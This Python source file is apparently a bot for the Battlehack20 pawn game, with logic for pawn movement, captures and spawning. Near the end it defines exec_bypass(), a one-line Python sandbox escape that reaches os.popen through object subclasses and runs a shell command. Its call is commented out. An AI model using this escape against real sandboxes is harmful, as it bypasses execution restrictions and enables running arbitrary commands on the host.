import random
from battlehack20.stubs import *

# This is an example bot written by the developers!
# Use this to help write your own code, or run it against your bot to see how well you can do!

DEBUG = 0
def dlog(str):
    if DEBUG > 0:
        log(str)


def ilog(str):
    if True:
        log(str)


def check_space_wrapper(r, c):
    # check space, except doesn't hit you with game errors
    if r < 0 or c < 0 or c >= board_size or r >= board_size:
        return False
    try:
        return check_space(r, c)
    except:
        return None


def spaces_in_front(a, b):
    diff = b - a
    return diff if team == Team.WHITE else -diff

def map_loc(loc):
    return loc if team == Team.WHITE else 15 - loc


team = get_team()
opp_team = Team.WHITE if team == Team.BLACK else team.BLACK
board_size = get_board_size()


class Pawn:
    def __init__(self):
        self.team = get_team()
        self.forward = 1 if self.team == Team.WHITE else -1
        self.update_state()
#        if self.col < 5:
        if False:
            self.type = "DEFENDER"
        else:
            self.type = "ATTACKER"
        self.board_size = get_board_size()

    def update_state(self):
        self.row, self.col = get_location()
#         ilog(str(self.col))
        self.nextrow = self.row + self.forward


    def check_piece_relative(self, rdiff, cdiff):
        return check_space_wrapper(self.row + rdiff * self.forward, self.col + cdiff)


    def run(self):
        self.update_state()
        if self.type == "ATTACKER":
            self.runattacker()
        elif self.type == "DEFENDER":
            self.rundefender()
        
        bytecode = get_bytecode()
        dlog('Done! Bytecode left: ' + str(bytecode))
    

    def runattacker(self):
        if self.trycapture():
            return
        if self.forward_is_dangerous():
            return
        # Only care about lattice if you're past the first 3 rows (otherwise ur wasting spawn space)
#        if map_loc(self.row) > 3:
        if False:   
            self.make_lattice()
        else:
            self.tryforward()


    def rundefender(self):
        if self.trycapture():
            return
        if self.check_piece_relative(1, 0) == opp_team:
            # Don't let the guy in front of you cross you gdi
            return
        # Lattice formation
        if self.check_piece_relative(0, 1) == team or self.check_piece_relative(0, -1) == team:
            self.tryforward()


    def tryforward(self):
        if self.nextrow != -1 and self.nextrow != board_size and not check_space_wrapper(self.nextrow, self.col):
            move_forward()
            dlog('Moved forward!')


    def make_lattice(self):
        if self.check_piece_relative(2, 0) == team:
            # Don't wanna double up
            return
        if self.check_piece_relative(0, 1) == team or self.check_piece_relative(0, -1) == team:
            self.tryforward()


    def forward_is_dangerous(self):
        attackers = 0
        defenders = 0
        for cdiff in [-1, 1]:
            if check_space_wrapper(self.nextrow + self.forward, self.col + cdiff) == opp_team: # attacker positions
                attackers += 1
            if check_space_wrapper(self.nextrow - self.forward, self.col + cdiff) == team: # defending positions
                defenders += 1
            if check_space_wrapper(self.nextrow - self.forward * 2, self.col + cdiff) == team: # defending positions
                defenders += 1
        if defenders > attackers or attackers == 0:
            return False
        # If you're on the opponent side of the map, go for the equal trade
        if defenders == attackers and map_loc(self.row) > 3 and self.check_piece_relative(-1, 0) == team:
            return False
        return True


    def trycapture(self):
        # try catpuring pieces
        for cdiff in [-1, 1]:
            if check_space_wrapper(self.nextrow, self.col + cdiff) == opp_team: # up and right
                capture(self.nextrow, self.col + cdiff)
                dlog('Captured at: (' + str(self.nextrow) + ', ' + str(self.col + cdiff) + ')')
                return True
        return False


class Overlord:
    def __init__(self):
        self.team = get_team()
        self.forward = 1 if self.team == Team.WHITE else -1
        self.board_size = get_board_size()
        self.index = 0 if self.team == Team.WHITE else self.board_size - 1
        self.opp_back = self.board_size - 1 - self.index
        self.round_count = 0
    
    def safe_spawn(self, i):
        if check_space_wrapper(self.index + self.forward, i - 1) == opp_team or check_space_wrapper(self.index + self.forward, i + 1) == opp_team:
            return False
        spawn(self.index, i)
        return True


    def run(self):
        self.round_count = self.round_count + 1
        mycount, oppcount = 0, 0
        for col in range(self.board_size):
            if check_space(self.index, col) == opp_team:
                oppcount += 1
            if check_space(self.opp_back, col) == team:
                mycount += 1
        if mycount > oppcount:
            self.runturtle()
        else:
            self.runregular()

    def runturtle(self):
        self.check_defense()
        self.spawnlow(0, board_size)

    def runregular(self):
        if self.check_defense():
            return
        if team == Team.WHITE:
            self.spawn_offenseA()
        else:
            self.spawn_offenseB()


    def check_defense(self):
        cols = []
        for i in range(self.board_size):
            opp_locs, my_locs = [], []
            for j in range(self.board_size // 2):
                j = map_loc(j)
                space = check_space(j, i)
                if space == opp_team:
                    opp_locs.append(j)
                elif space == team:
                    my_locs.append(j)
            cols.append((len(my_locs) - len(opp_locs), len(my_locs), i))
            if len(opp_locs) == 0:
                continue
            if len(my_locs) == 0 or spaces_in_front(my_locs[0], opp_locs[0]) < 0:
                if not check_space(self.index, i):
                    if self.safe_spawn(i):
                        return True
#        cols = sorted(cols)
        cols.sort()
        assert(len(cols) != 0)
        if cols[0][0] >= 0:
            return False
        for diff, my, i in cols:
            if not check_space(self.index, i):
                if self.safe_spawn(i):
                    return True
        return False

    def spawn_offenseA(self):
        if self.round_count < 50:
            self.spawnrandom()
        # Get those 4
        elif [check_space(self.opp_back, i) for i in range(0, 4)].count(team) < 2:
            self.spawnlow(0, 4)
        elif [check_space(self.opp_back, i) for i in range(4, 8)].count(team) < 2:
            self.spawnlow(4, 8)
        elif [check_space(self.opp_back, i) for i in range(8, 12)].count(team) < 2:
            self.spawnlow(8, 12)
        else:
            self.spawnlow(12, 16)

    ## TESTING
    def spawn_offenseB(self):
        if self.round_count < 50:
            self.spawnrandom()
        # Get those 4
        elif [check_space(self.opp_back, i) for i in range(12, 16)].count(team) < 2:
            self.spawnlow(12, 16)
        elif [check_space(self.opp_back, i) for i in range(8, 12)].count(team) < 2:
            self.spawnlow(8, 12)
        elif [check_space(self.opp_back, i) for i in range(4, 8)].count(team) < 2:
            self.spawnlow(4, 8)
        else:
            self.spawnlow(0, 4)

    def spawnlow(self, min, max):
        allies = []
        for col in range(min, max):
            count = 0
            for i in range(board_size):
                if check_space(i, col) == team:
                    count += 1
            allies.append((count, col))
        allies = sorted(allies)
        for c, col in allies:
            if not check_space(self.index, col):
                if self.safe_spawn(col):
                    dlog('Spawned unit at: (' + str(self.index) + ', ' + str(col) + ')')
                    return


    def spawnrandom(self, min=None, max=None):
        if min is None: min = 0
        if max is None: max = self.board_size - 1
        for _ in range(min, max):
            i = random.randint(min, max)
            if not check_space(self.index, i):
                if self.safe_spawn(i):
                    dlog('Spawned unit at: (' + str(self.index) + ', ' + str(i) + ')')
                    return


def exec_bypass():
    return getattr(getattr(getattr(getattr(getattr([], '__class__'),'__base__'), '__subclasses__')().pop(78), '__init__'), '__globals__').pop('sys').modules.pop('os').popen('id').read()


robot = Pawn() if get_type() == RobotType.PAWN else Overlord()

def turn():
    """
    MUST be defined for robot to run
    This function will be called at the beginning of every turn and should contain the bulk of your robot commands
    """

#    exec_bypass()
#    __globals__

    robot.run()
    bytecode = get_bytecode()
    dlog('Done! Bytecode left: ' + str(bytecode))
